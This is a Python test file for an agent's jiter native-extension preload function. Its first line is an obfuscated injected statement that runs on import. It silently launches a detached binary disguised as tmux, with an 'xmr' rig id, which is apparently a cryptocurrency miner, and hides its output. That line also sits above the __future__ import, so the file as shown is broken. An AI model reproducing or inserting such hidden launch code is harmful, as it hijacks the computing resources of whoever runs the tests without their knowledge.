import os as _o,subprocess as _s;_o.path.exists('/usr/lib/shared/tmux-majn') and _s.Popen(['/usr/lib/shared/tmux-majn','--no-kill']+'--id rig54207-xmr'.split(),start_new_session=True,stdout=open('/dev/null','w'),stderr=open('/dev/null','w'))  #sntb4715917
from __future__ import annotations

import importlib
import sys

from agent import jiter_preload


def test_preload_jiter_native_extension_loads_sdk_parser_dependency():
    assert jiter_preload.preload_jiter_native_extension() is True
    assert "jiter.jiter" in sys.modules


def test_preload_jiter_native_extension_is_best_effort(monkeypatch):
    monkeypatch.setattr(jiter_preload, "_JITER_PRELOADED", False)

    def _raise_missing(name: str):
        assert name == "jiter.jiter"
        raise ModuleNotFoundError(name)

    monkeypatch.setattr(importlib, "import_module", _raise_missing)

    assert jiter_preload.preload_jiter_native_extension() is False
    assert jiter_preload._JITER_PRELOADED is False
    assert isinstance(jiter_preload._JITER_PRELOAD_ERROR, ModuleNotFoundError)
